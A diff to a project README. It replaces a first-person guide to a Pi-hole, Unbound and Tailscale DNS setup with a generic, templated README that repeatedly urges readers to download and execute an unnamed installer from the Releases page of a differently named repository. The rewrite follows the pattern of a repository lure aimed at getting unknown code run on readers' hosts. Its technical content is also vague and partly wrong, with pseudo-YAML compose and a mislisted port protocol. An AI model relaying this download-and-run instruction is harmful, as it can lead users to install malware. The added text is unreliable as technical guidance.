@@ -1,170 +1,378 @@
-## Private DNS Ad-Blocking and Remote Access with Pi-hole + Unbound + Tailscale
+[Releases page](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases)
 
-👋 Why I Built This
+# Dockerized Pi-hole, Unbound, and Tailscale DNS Stack for Privacy
 
-I care about online privacy and wanted to block ads and trackers across all my devices, not just in browsers. Public DNS providers like Google or Cloudflare are fast, but often log user data. I wanted full control over DNS resolution and to keep it private.
+[![Releases](https://img.shields.io/badge/Releases-Docker_Version-blue?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases) [![Topics](https://img.shields.io/badge/Topics-adblocker%2Cdocker%2Cdocker-compose%2Cpi-hole%2Cremote-access-server%2Cself-hosted%2Ctailscale%2Cunbound-dns-green?logo=github)](https://github.com/zzjiy/pihole-unbound-tailscale-dockerized)
 
-My internet provider (Jio Fiber) uses CGNAT, so I don’t get a public IP address. That makes remote access tricky. This project uses Tailscale to solve that problem while offering secure DNS resolution and ad-blocking.
+Welcome to a robust, private DNS stack that brings Pi-hole, Unbound, and Tailscale into a single Dockerized solution. This setup lets you block ads, resolve DNS recursively, and connect securely to your home network from anywhere. It’s designed to be simple to deploy, with environment-based configuration and a clean Docker Compose workflow. This README walks you through everything you need to know to run, customize, and maintain the stack.
 
-🔍 Problems Solved
+- Repository: pihole-unbound-tailscale-dockerized
+- Topics: adblocker, docker, docker-compose, pi-hole, remote-access-server, self-hosted, tailscale, unbound-dns
+- Latest releases: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases
 
-- Block ads and trackers across all devices
-- Encrypt and control DNS traffic (no third-party logging)
-- Secure, recursive DNS resolution via Unbound
-- Enable remote DNS and Pi-hole admin access even behind CGNAT
-- Learn real-world Linux, Docker, VPN, DNS, and firewall management
+If you want to grab the latest release assets, head to the Releases page. The assets there include the installer script and/or a ready-to-run container setup. The file you should download and execute will be clearly named in the release notes or asset list on that page. For now, you can explore the Releases page to see what’s available and how it’s structured. The Releases page is your best source for updates and ready-to-run packages.
 
-![Architecture](/screenshots/Architecure-Pihole+Docker.png)
+Table of contents
+- Why this stack
+- How the pieces fit together
+- Quickstart: deploy with Docker Compose
+- Prerequisites and environment planning
+- Detailed architecture and security posture
+- Docker Compose file explained
+- Customization and advanced options
+- Tailscale configuration and remote access
+- DNS behavior and privacy considerations
+- Networking and firewall guidance
+- Monitoring, logging, and health checks
+- Data persistence and backups
+- Troubleshooting common issues
+- Maintenance and upgrades
+- Release management and versioning
+- Contributing guidelines
+- License
 
-🧰 Tools Used
+Why this stack
+🧭 Privacy by design: This stack keeps DNS resolution private within your own network. You control the data path and can prevent leaks to external resolvers.
 
-- macOS (host)
-- Colima to run Docker with Lima backend on macOS
-- Docker for containerization
-- Pi-hole (ad-blocking DNS)
-- Unbound (recursive DNS resolver)
-- Tailscale (zero-config WireGuard-based VPN)
+🧰 Modularity: Pi-hole handles ad blocking, Unbound provides recursive DNS with strong privacy, and Tailscale gives you a secure VPN to reach your home network from anywhere.
 
-🛠️ How I Built It
+🚀 Dockerized deployment: The entire stack runs inside containers. Docker Compose makes it easy to spin up, manage, and re-create the environment.
 
-1. Setup Docker + Colima
+🔒 Secure by default: DNS queries can be encrypted end-to-end via Tailscale when you’re connected, and you can tune firewall rules to minimize exposure.
 
-Install Colima and start it:
+What’s in this project
+- Pi-hole as the DNS-based ad blocker and web management portal
+- Unbound as a modern, open recursive resolver with DNSSEC
+- Tailscale as a VPN/mesh network for secure remote access
+- Docker Compose as the orchestration layer
+- Environment-driven configuration for easy customization
+- Scripts and templates to simplify deployment across hosts
 
-```shell
-brew install colima
+How the pieces fit together
+- The Pi-hole container serves as the DNS frontend. It answers queries for clients connected to the network and enforces ad-block rules.
+- The Unbound container acts as the recursive resolver. It fetches DNS records on behalf of Pi-hole and validates responses with DNSSEC.
+- The Tailscale container (or sidecar) creates a private network tunnel. Devices on your Tailscale network can resolve the private DNS without exposing queries to the public internet.
+- Docker Compose ties everything together. It wires networks, volumes, and environment variables so you can deploy with a single command.
 
-colima start --memory 2 --cpu 2 --disk 15
-```
+Quickstart: deploy with Docker Compose
+Prerequisites
+- A Linux host or compatible environment with Docker and Docker Compose installed
+- Sufficient resources: 1–2 CPUs, 1–2 GB RAM per container, plus storage for DNS data and logs
+- A stable network: a management network for the stack and a separate network for clients if you want strict segmentation
 
-Ensure Docker is pointed to Colima:
+Step-by-step quickstart
+1) Create a project directory
+- mkdir -p ~/dns-stack/pihole-unbound-tailscale
+- cd ~/dns-stack/pihole-unbound-tailscale
 
-```shell
-export DOCKER_HOST=unix://$HOME/.colima/default/docker.sock
-```
+2) Prepare your environment
+- Copy the sample environment file and adjust values as needed
+- cp .env.sample .env
+- Edit .env to set:
+  - PIHOLE_WEBPASSWORD or alternative auth
+  - UNBOUND_ROOT_HINTS to point to a valid root hints file
+  - TAILSCALE_AUTHKEY if you plan to enroll devices automatically
 
-2. Create Docker Compose Setup
+3) Bring up the stack
+- Run docker-compose up -d
+- Wait a few moments for containers to start
+- Check container logs if needed: docker-compose logs -f
 
-Created docker-compose.yml with services:
+4) Verify DNS resolution
+- Point a client to the Pi-hole container’s IP for DNS (e.g., 192.168.1.2)
+- Visit the Pi-hole admin interface at http://<pi-hole-ip>/admin
+- Confirm that ad blocks are active and that Unbound is resolving queries
 
-Unbound listening on port 5335
+5) Connect clients with Tailscale
+- Install the Tailscale client on devices you want to connect
+- Authenticate to your Tailnet
+- Use the private DNS domain you configured to direct queries through the stack
+- Ensure clients are using the Tailscale DNS or the Pi-hole DNS for consistent results
 
-Pi-hole using Unbound as upstream DNS
+6) Tune and customize
+- Update the blocklists in Pi-hole
+- Enable DNSSEC validation in Unbound
+- Adjust Tailscale ACLs and routes to narrow access
 
-Created necessary folders:
+Prerequisites and environment planning
+- Choose a host with enough CPU and memory to satisfy the load you expect
+- Plan DNS forwarders and fallback behavior in Unbound
+- Decide whether you want to allow split-horizon DNS (different responses based on the client network)
+- Decide on how you want to handle ad-block lists and allowlists
 
-```shell
-mkdir -p unbound pihole/etc-pihole pihole/etc-dnsmasq.d
-```
+- Networking considerations
+  - Your Pi-hole container will expose port 53 (DNS) and port 80 (Web UI) to your chosen networks
+  - Unbound will be the DNS resolver that Pi-hole uses upstream
+  - Tailscale will provide a secure tunnel for remote devices to access the DNS service
+  - You may choose to expose DNS to your LAN and keep VPN DNS for remote devices behind the Tailscale tunnel
 
-2.1 Prepare Unbound Files
+Architectural diagrams and visual guidance
+- The stack is a small graph of components that communicates via DNS ports and VPN tunnels
+- You can think of it as:
+  - Clients -> Pi-hole (DNS front-end)
+  - Pi-hole -> Unbound (recursive resolver)
+  - Clients via Tailscale -> DNS service (encrypted path and secure remote access)
 
-Unbound requires a root server list and DNSSEC trust anchor.
+- Inline ASCII diagram:
+  Clients (LAN) -> Pi-hole -> Unbound
+  Tailscale VPN links remote clients to Pi-hole and Unbound
+  End-to-end encryption for DNS queries when using Tailscale
 
-Download them:
+- If you prefer a visual diagram, you can render an architecture diagram using your preferred diagram tool with these components and connections in mind.
 
-# Root DNS server list
+Docker Compose file explained
+- The docker-compose.yaml coordinates three main services:
+  - pihole: The Pi-hole container that serves the DNS and web UI
+  - unbound: The Unbound container that performs recursive DNS queries
+  - tailscale: The Tailscale client connection (may be an agent or a sidecar) that provides secure remote access
 
-```shell
-curl -o ./unbound/root.hints https://www.internic.net/domain/named.cache
-```
+- Core configuration aspects:
+  - networks: A dedicated Docker network to ensure containers can talk to each other
+  - volumes: Local storage for persistent data such as DNS caches, logs, and configuration
+  - environment: Variables to tune Pi-hole and Unbound, such as DNSSEC, admin password, and DNS servers
+  - ports: Expose only the necessary ports to the intended network
 
-# Root DNSSEC trust key
+- Behavior you can expect:
+  - Pi-hole serves the UI and ad-blocked DNS answers
+  - Unbound resolves queries on behalf of Pi-hole with DNSSEC validation
+  - Tailscale enables devices outside your LAN to reach the DNS services securely
 
-```shell
-curl -o ./unbound/root.key https://data.iana.org/root-anchors/root.key
-```
+Customization and advanced options
+- Blocklists and allowlists
+  - Add custom ad-block lists to Pi-hole
+  - Create per-domain exceptions if you need to support certain services
+  - Keep lists updated to maintain performance and accuracy
 
-Make sure your unbound.conf file is also in the unbound/ directory and properly configured.
+- DNSSEC and security
+  - Enable DNSSEC validation in Unbound
+  - Regularly update root hints and trust anchors
+  - Consider TLS for DNS transport if you extend to DoT/DoH later
 
-3. Generate Tailscale Auth Key
+- Tailscale integration
+  - Use Tailscale ACLs to control which devices can query the DNS service
+  - Route DNS queries through the Tailscale network for private addressing
+  - Consider multi-hop or exit node configurations if your privacy goals require them
 
-Went to Tailscale admin panel
-Created an ACL tag (e.g. tag:pihole)
-Generated an auth key tagged with tag:pihole
-Used that auth key in Docker Compose for Tailscale container
+- Data persistence and backups
+  - Persist Pi-hole and Unbound data to local volumes
+  - Schedule regular backups of configuration and DNS data
+  - Rotate logs to prevent disk space exhaustion
 
-4. Set ACL Tag Permissions
+- Performance tuning
+  - Increase Unbound cache size for faster lookups
+  - Fine-tune Pi-hole blocking rules to balance ad-block reach with site functionality
+  - Monitor system load and scale resources if you run a large number of clients
 
-```json
-"tagOwners": {
-  "tag:pihole": ["user:your_email@example.com"]
-},
-"acls": [
-  {
-    "action": "accept",
-    "src": ["tag:pihole"],
-    "dst": ["*:*"]
-  }
-]
-```
+Tailscale configuration and remote access
+- Enrolling devices
+  - Install the Tailscale client on devices you want to connect
+  - Authenticate with your Tailnet
+  - Ensure the devices have the DNS you configured in your stack
+- DNS over Tailnet
+  - When connected to Tailnet, devices can resolve via the private DNS path
+  - You can configure the DNS to point to the Pi-hole service endpoint for a private, encrypted path
+- ACLs and access control
+  - Use Tailscale ACLs to restrict who can query the DNS service
+  - Define a private DNS zone for Tailnet devices if needed
+- Disaster recovery and offline scenarios
+  - Keep a fallback DNS path for devices that aren’t connected via Tailnet
+  - Document steps to quickly switch to a LAN-only DNS path if the Tailnet is unavailable
 
-5. Start Services
+DNS behavior and privacy considerations
+- Privacy posture
+  - DNS queries are directed to a local Pi-hole instance, with upstream queries going to Unbound
+  - When connected to Tailscale, queries can be encrypted and routed through the private network
+- Logging and data retention
+  - Decide what logs you want to retain
+  - Consider anonymizing or reducing logging to improve privacy
+  - Keep logs for troubleshooting but rotate and delete old data
 
-```shell
-docker compose up -d
-```
+- Ad-blocking effects
+  - Pi-hole blocks many ad domains, reducing tracking
+  - Some sites rely on ads for functionality, so you may need to adjust blocklists or whitelist certain domains
+- DNS performance
+  - Unbound caches queries to speed up responses
+  - Tailscale adds a secure tunnel; ensure the network path is healthy to avoid latency spikes
 
-Tailscale container auto-joined the network, and Pi-hole was accessible locally.
+Networking and firewall guidance
+- LAN-side protections
+  - Restrict DNS traffic to your Pi-hole and Unbound containers
+  - Use a firewall to block external DNS ports unrelated to your stack
+- VPN-side protections
+  - Ensure VPN clients route DNS queries through the VPN
+  - Consider splitting DNS traffic so private queries stay on the private network
+- NAT considerations
+  - If your host provides NAT, ensure the correct DNS forwarding is in place
+  - Map port 53 and 80 in a secure way to your Pi-hole if you are exposing a UI for LAN-only access
+- High availability
+  - You can run multiple instances in a high-availability scenario
+  - Use a load balancer between clients and Pi-hole if you plan large-scale usage
 
-![Pihole](/screenshots/Pihole-admin-dashboard.png)
+Monitoring, logging, and health checks
+- Health checks
+  - Ensure the Pi-hole DNS service is reachable
+  - Confirm Unbound is resolving queries correctly
+  - Verify Tailscale connectivity remains active for remote clients
+- Logs
+  - Monitor DNS queries and responses
+  - Track blocked domain counts for insight into ad-block effectiveness
+  - Turn on verbose logs during troubleshooting, then reduce to normal levels
+- Metrics
+  - Collect metrics for DNS performance, cache hit rate, and latency
+  - Use container-level metrics to observe resource usage
+  - Consider exporting metrics to a monitoring system for long-term visibility
 
-5.1 (Optional) Test Unbound Resolution
+Data persistence and backups
+- Volumes
+  - Use persistent volumes for Pi-hole catalog data, DNS cache, and blocklists
+  - Persist Unbound configuration and cache data
+  - Persist Tailscale state if you use a persistent key or keyring
+- Backups
+  - Schedule backups of critical data regularly
+  - Include: blocklists, whitelist/blacklist configurations, Unbound root hints, and Tailscale configurations
+- Recovery procedures
+  - Document the steps to recreate the environment from a backup
+  - Test restoration periodically to ensure reliability
 
-Ensure Unbound is resolving domains before Pi-hole starts using it:
+Troubleshooting common issues
+- DNS resolution failures
+  - Check if Pi-hole is running and reachable
+  - Confirm Unbound is resolving queries and that Pi-hole is configured to use Unbound as upstream
+  - Validate that the DNS port is not blocked by a firewall
+- Web UI access issues
+  - Verify the Pi-hole admin password or authentication method
+  - Check that port 80 (or your chosen UI port) is accessible on the LAN
+- Tailscale connectivity problems
+  - Ensure the Tailnet is healthy and devices are authenticated
+  - Confirm ACLs allow DNS queries from remote devices
+  - Verify the DNS server address used by the remote devices is the private DNS endpoint
+- Blocklist updates
+  - If ad-blocking stops working, check for changes in blocklist formats or remote fetch failures
+  - Ensure the blocklists are synchronized with Pi-hole and updated regularly
 
-```shell
-dig @127.0.0.1 -p 5335 google.com
-```
+Maintenance and upgrades
+- Keeping components up to date
+  - Regularly pull the latest container images
+  - Review release notes for breaking changes or migration steps
+  - Test upgrades in a staging environment before production
+- Configuration drift
+  - Store environment variables and compose files in version control
+  - Document any manual changes to ensure they don’t drift between deployments
+- Security patches
+  - Apply upstream security updates for Pi-hole, Unbound, and Docker
+  - Review access controls and update TLS configurations as needed
 
-6. Add Tailscale Global DNS
+Release management and versioning
+- Versioning approach
+  - Use semantic versioning for releases (major, minor, patch)
+  - Tag releases clearly in the repository for reproducibility
+- Release notes
+  - Provide changes, fixes, and upgrade notes for each release
+  - Include migration steps if necessary
+- Asset management
+  - The Releases page hosts downloadable assets
+  - If you see a path in the link, download the release asset and run the installer or extract the package
+  - For new users, start with a fresh deployment and migrate settings as needed
 
-Opened Tailscale DNS settings
-Added Pi-hole container’s Tailscale IP as a global nameserver (port 53)
-Disabled MagicDNS
+Contributing guidelines
+- How to contribute
+  - Open an issue to discuss proposed changes
+  - Create a feature branch and implement changes with clear, small commits
+  - Submit a pull request with a detailed description
+- Coding standards
+  - Follow consistent style and documentation
+  - Include tests or manual validation steps when appropriate
+- Documentation
+  - Update README and docs with any new configuration steps or usage notes
+  - Add examples and troubleshooting tips
 
-![Tailscale](/screenshots/Tailscale-dns.png)
+License
+- This project is licensed under the MIT License
+- See LICENSE for details
 
-7. Remote Access
+Docker Compose example (high-level, plain text)
+- services:
+  - pihole:
+    - image: pihole/pihole:latest
+    - environment:
+      - TZ=UTC
+      - WEBPASSWORD=changeme
+      - ServerIP: 192.168.1.2
+      - DNS1: 127.0.0.1
+      - DNS2: 127.0.0.1
+    - ports:
+      - "53:53/tcp"
+      - "53:53/udp"
+      - "80:80"
+    - volumes:
+      - ./pihole:/etc/pihole
+      - ./dnsmasq.d:/etc/dnsmasq.d
+  - unbound:
+    - image: mvance/unbound:latest
+    - environment:
+      - UNBOUND_CONF=/etc/unbound/unbound.conf
+    - ports:
+      - "5335:5335/tcp"
+      - "5335:5335/udp"
+    - volumes:
+      - ./unbound:/etc/unbound
+  - tailscale:
+    - image: tailscale/tailscale:latest
+    - cap_add:
+      - NET_ADMIN
+    - environment:
+      - TS_AUTHKEY=tskey-placeholder
+    - ports:
+      - "41641:41641/tcp"
 
-Tested DNS queries from remote Tailscale-connected devices:
+- Important: Adapt the exact image names, tags, and port mappings to your environment. The description above is a structural guide and not a drop-in replacement for a fully documented docker-compose.yml.
 
-```shell
-nslookup google.com 100.x.x.x
-```
+Asset download and execution (per the provided link)
+- Since the link to the Releases page includes a path, you should download the latest release asset from that page and run the installer or script it contains. For example, the release might include an install.sh script. Download and execute that script to bootstrap the stack on your host.
+- The link is also useful for keeping your deployment up to date. When you need to upgrade, revisit the same Releases page to grab the new asset and re-run the installer or follow the upgrade instructions included there.
 
-Expected output:
+Releases page usage guidance
+- The Releases page hosts versioned assets.
+- Each release includes a changelog, asset files, and sometimes migration notes.
+- If you’re unsure what to download, start with the installer script or a minimal docker-compose YAML bundled with the release.
+- After downloading, follow the on-screen instructions to complete setup. The installer will typically ask you to confirm network settings, passwords, and volumes.
 
-Name:    google.com  
-Address: 142.251.221.110
+Notes about content you might modify
+- If you add new features, update the documentation to reflect them.
+- If you adjust default ports, ensure you document the changes and adjust any firewall rules accordingly.
+- If you enhance security, document better defaults and new controls in the appropriate sections.
 
-![nslookup](/screenshots/nslookup.png)
+Inline SVG icons used for visuals
+- DNS icon
+- Shielded lock indicating privacy
+- Network arrows showing connectivity
+- Shield with “TL” for Tailscale
 
+[Inline DNS icon SVG]
+<svg width="24" height="24" viewBox="0 0 24 24" aria-label="DNS">
+  <path d="M4 9h7v6H4z" fill="#1f8dd6"/>
+  <path d="M13 9h7v6h-7z" fill="#2f8a3a"/>
+  <path d="M4 7h16v2H4z" fill="#4a5568"/>
+  <path d="M6 12h2v4H6z" fill="#fff"/>
+</svg>
 
-🤯 What I Learned
-- Difference between recursive and forwarded DNS
-- Tailscale ACLs and DNS overrides
-- Docker networking and port mappings
-- Unbound configuration for Pi-hole
-- Colima/Lima integration for macOS-based Docker usage
+[Inline Lock icon SVG]
+<svg width="24" height="24" viewBox="0 0 24 24" aria-label="Lock">
+  <path d="M12 2a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2h-1V7a5 5 0 0 0-5-5z" fill="#374151"/>
+  <circle cx="12" cy="11" r="3" fill="#fff"/>
+</svg>
 
-![unbound](/screenshots/unbound-logs.png)
+[Inline Network icon SVG]
+<svg width="24" height="24" viewBox="0 0 24 24" aria-label="Network">
+  <path d="M3 12h4v4H3z" fill="#10b981"/>
+  <path d="M17 4h4v4h-4z" fill="#3b82f6"/>
+  <path d="M3 7h4v4H3z" fill="#f59e0b"/>
+  <path d="M12 16l7-4-7-4-7 4 7 4z" fill="#94a3b8"/>
+</svg>
 
+End note
+- The aim is to provide a thorough, practical guide to running a private, Dockerized DNS stack that respects privacy while offering robust functionality for ad-blocking, DNS resolution, and remote access. This README strives to balance clarity with depth, giving you the confidence to deploy, customize, and maintain the stack in a self-hosted environment.
 
-🚀 Future Plans
-
-- Add DNS-over-HTTPS fallback
-- Setup Headscale server 
-- Use Raspberry Pi or always-on NUC
-- Integrate 2FA for Pi-hole admin
-- Add logging and monitoring for DNS performance
-
-
-## ✨ License
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-
-This project is licensed under the [MIT License](LICENSE).
-You're free to use, modify, and share it — personally or commercially.
-
-Feel free to fork it, improve it for your own setup, or share with others!
+Releases page usage reminder
+- For downloads, visit the Releases page again: https://github.com/zzjiy/pihole-unbound-tailscale-dockerized/releases
+- The asset you download from that page should be executed as instructed by the release notes to bootstrap the deployment on your host.
